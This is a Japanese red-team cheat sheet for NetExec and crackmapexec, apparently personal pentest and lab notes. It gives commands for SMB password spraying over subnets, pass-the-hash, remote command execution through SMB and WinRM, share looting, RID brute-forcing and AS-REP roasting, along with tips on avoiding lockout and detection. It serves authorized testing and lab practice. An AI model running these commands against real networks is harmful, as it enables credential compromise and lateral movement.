---
title: NetExec
parent: Tools
grand_parent: Red Team
---

<details markdown="1"><summary>RDP</summary>
# RDP
</details>

---

<details markdown="1"><summary>SMB</summary>
# SMB

## 基本パターン一覧（目的別）
### A. 単一資格情報 → 単一ホスト（確認）

目的：そのユーザ/パスで当該ホストにログインできるか最速確認。

```zsh
nxc smb 192.168.1.10 -u 'corp\\user1' -p 'P@ssw0rd!'
```

成功なら --exec で簡単なコマンド確認

```zsh
nxc smb 192.168.1.10 -u 'corp\\user1' -p 'P@ssw0rd!' -x "whoami && hostname"
```

成功したら、権限（一般/管理者）を確認するコマンドを実行（whoami /priv, net localgroup administrators 等）。

### B. 単一資格情報 → 多数ホスト（水平探索 / 横展開候補探し）

目的：同じ資格情報が複数ホストで有効かを探り、横展開先を見つける。
パターン：user+pass をサブネット全体に試す（ただし速度調整必須）。

```zsh
nxc smb 192.168.1.0/24 -u 'corp\\svc_backup' -p 'Backup!2025'
```

出力をファイルに保存して成功ホストのみ抽出

```zsh
nxc smb 192.168.1.0/24 -u 'corp\\svc_backup' -p 'Backup!2025' > spray_results.txt
```
ポイント：高速で一気にやると検知・ロックされる。時間分散や間隔を入れて。

### C. 複数ユーザ（ユーザリスト） → 単一ホスト（当該ホストの全アカウント確認）

目的：そのホストにどのアカウントがログインできるかを確認。

```zsh
nxc smb 192.168.1.10 -u users.txt -p 'CommonPass123'
```

または複数パスワードを試す

```zsh
nxc smb 192.168.1.10 -u users.txt -p passwords.txt
```
注意：同一ホストに対して短時間に多数試行するとロックされやすい。

### D. 複数ユーザ × 複数ホスト（フルスキャン／検出耐性あり）

目的：持っているユーザ集合とパス集合で全網羅的にチェック（合意がある場合のみ）。
運用上はジョブ分割＋遅延を入れるべき。

```zsh
nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt > all_results.json
```


実務TIP：小さなサブネットに分割して時間差で実行。成功のみ抽出して次ステップへ。
成功後、管理者権限の確認やサービス操作を実行。
F. 認証後の列挙 → 次の攻撃決定

目的：ログインできたホストでどこまで進めるか（権限、共有、LDAPなど）を判断する。

## 共有一覧

```zsh
nxc smb 192.168.1.10 -u 'corp\\user1' -p 'P@ss' --shares
```



## WinRMでコマンド実行（PowerShellで情報収集）

```zsh
nxc winrm 192.168.1.10 -u 'corp\\user1' -p 'P@ss' -x "Get-LocalUser; Get-LocalGroup"
```


列挙結果を基に、管理者アカウントやサービスアカウント、バックアップ共有等を狙う。

G. 権限チェック（管理者権限の有無確認）

目的：その資格情報で管理者権限を持つか素早く確認。

## Windowsでのシンプルチェック

```zsh
nxc smb 192.168.1.10 -u 'corp\\user1' -p 'P@ss' -x "whoami /priv || net user %USERNAME% /domain"
```

## ローカル管理者グループ確認

```zsh
nxc smb 192.168.1.10 -u 'corp\\user1' -p 'P@ss' -x "net localgroup administrators"
```


管理者なら横展開や持続化操作の選択肢が広がる（ただし実行は合意内で）。

H. ファイルアクセス確認（共有の読み取り／書き込み権）

目的：認証で共有へアクセスできるか、重要データ取得の可否を確認。

## 共有一覧 → 特定ファイルをダウンロード（ツールにdownloadオプションがある場合）
```zsh
nxc smb 192.168.1.10 -u 'corp\\user1' -p 'P@ss' --shares
```

```zsh
nxc smb 192.168.1.10 -u 'corp\\user1' -p 'P@ss' --download '\\\\192.168.1.10\\share\\secret.xlsx' -o ./loot/
```


取得は最小限、取り扱いは暗号化してレポートへ。

I. サービス／スケジュールタスク確認（破壊せず確認のみ）

目的：サービスアカウントやタスクに使える権限があるか調べる。

```zsh
nxc smb 192.168.1.10 -u 'corp\\user1' -p 'P@ss' -x "sc query type= service" 
```

## サービス一覧（読み取り）

```zsh
nxc winrm 192.168.1.10 -u 'corp\\user1' -p 'P@ss' -x "Get-ScheduledTask | Select-Object -First 20"
```


注意：サービス停止やタスク作成等の操作は許可があっても慎重に。

J. アカウントロック対策（運用上の注意）

目的：誤ってアカウントをロックしないための運用方法。

少数ホストずつ試す（サブネット分割）

各グループ間に十分な待機時間を入れる（スリープ）

同じ資格情報を短時間に多数ホストで試さない

時間帯を分散する（夜間等）※合意がある場合のみ
（nxc に標準で --delay オプションがあるかはバージョン差があるので、無ければ自前でループ＋sleepで実装）

実務Tips（効率化・解析）

成功ログだけ抽出する：grep -i "SUCCESS" や JSON 出力でフィルタ。

成功ホストでまとめて -x "whoami && hostname && net localgroup administrators" を投げて即座に権限判定。

大量試行はジョブ分割→各ジョブはログ別ファイルに保存。

nxc modules list（あれば）で便利モジュールを探し、列挙やダンプを利用する。

既存の crackmapexec スクリプトを sed で単純置換しても、オプション差分は手作業確認が必要。

出力の扱い（証跡・レポート）

成果（成功ホスト、アクセス可能共有、実行結果）は日時付きファイルに保存。

ユーザ名・パスワードなど機密は暗号化して保存/転送。

テスト終了後、影響確認（サービス停止やアカウントロックが発生していないか）をクライアントと確認。


```zsh
crackmapexec smb 192.168.158.242 -u usernames.txt -p passwords.txt --continue-on-success
```
- --continue-on-success 最初の有効な認証情報で停止しないようにする

## Pass-the-Hash

目的：パスワードの代わりにNTLMハッシュでログインする。

```zsh
nxc smb 192.168.1.10 -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'
```

## rid-brute

*PG AD Vaultで登場*
```zsh
crackmapexec smb 192.168.152.172 -u guest -p "" --rid-brute
```

```zsh
nxc smb 192.168.145.30 -u 'a' -p '' --rid-brute
```

![](../../../../assets/images/Pasted%20image%2020260528001413.png)
![](../../../../assets/images/Pasted%20image%2020260528001424.png)
</details>

---

<details markdown="1"><summary>WinRM</summary>

# Win-RM

```zsh
nxc winrm eighteen.htb -u users -p 'iloveyou1'
```
![](../../../../assets/images/Pasted%20image%2020260528002320.png)

</details>

---

<details markdown="1"><summary>MSSQL</summary>
# MSSQL

```zsh
nxc mssql 192.168.143.158 -u db_user -p Password123! -d zeus.corp
```

```zsh
nxc mssql eighteen.htb -u 'kevin' -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
```

![](../../../../assets/images/Pasted%20image%2020260528001719.png)
![](../../../../assets/images/Pasted%20image%2020260528001730.png)
</details>

---

<details markdown="1"><summary>LDAP</summary>
# LDAP

```zsh
crackmapexec ldap -dc-ip 10.129.55.181 --kdcHost dc01.inlanefreight.htb -u nicole -p Inlanefreight02! --asreproast asreproast.out
```

# ユーザ/コンピュータ一覧
```zsh
nxc ldap dc.example.local -u 'corp\\user1' -p 'P@ss' --users --computers
```

</details>